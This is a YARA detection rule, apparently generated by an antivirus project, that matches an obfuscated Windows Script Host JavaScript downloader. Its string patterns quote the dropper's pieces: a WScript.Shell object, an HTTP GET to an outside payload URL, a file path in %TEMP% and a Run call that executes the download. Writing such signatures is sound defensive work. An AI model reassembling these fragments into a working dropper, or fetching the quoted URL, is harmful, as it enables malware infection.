rule sig_20160328_2a443bccbc735ca56b989aa061235083 {
  meta:
    description = "datamaliciousorder - file 20160328_2a443bccbc735ca56b989aa061235083.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d415e40474df96acf0f4b2a370d54e2194952694889dd1cff7b9b44fe5ffd29"

  strings:
    $s1  = "function Fpdivrsw() {return Lfiblmqu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"eQVcqbqOraTc.exe\";};" fullword ascii
    $s2  = "Ohnzsq[Umudrlu](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Tinkgpd](Ehbyfjqduk() * 11)} while (Ohnzsq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Fgcucfw(Qumzo, Gyaiqlscpe){return Qumzo - Gyaiqlscpe;};" fullword ascii
    $s5  = "var Lfiblmqu = function Etvmfpbo() {return WScript[Cwchdevd](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vpzeonggl() {return ((Xacybpgof == true) && (Xacybpgof == Ggosk)) ? 1 : Wscpyuk;};" fullword ascii
    $s7  = "function Vjvljtva(Rlpkl){Lfiblmqu[\"Run\"](Rlpkl, Wscpyuk, Wscpyuk);};" fullword ascii
    $s8  = "function Ancxdwixo(){return Cwchdevd;};" fullword ascii
    $s9  = "function Ehbyfjqduk(){return 22;};" fullword ascii
    $s10 = "function Cknowsz(Kndfusi) {var Pvijkvzia = (1, 2, 3, 4, 5, Kndfusi); return Pvijkvzia;};" fullword ascii
    $s11 = "var Ggosk = false;" fullword ascii
    $s12 = "function Wmwxjwpn()" fullword ascii
    $s13 = "var Apzqkrmryh = new this[\"Date\"]();" fullword ascii
    $s14 = "Ggosk = true; " fullword ascii
    $s15 = "return Fgcucfw(Hvxhlpyz, Ntdhagrb);" fullword ascii
    $s16 = "Xacybpgof = true; " fullword ascii
    $s17 = "function Btbysl(){return Znjngumq;};" fullword ascii
    $s18 = "var Zzrxoye = false;" fullword ascii
    $s19 = " while (Glnusrekxu){" fullword ascii
    $s20 = "var Xacybpgof = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}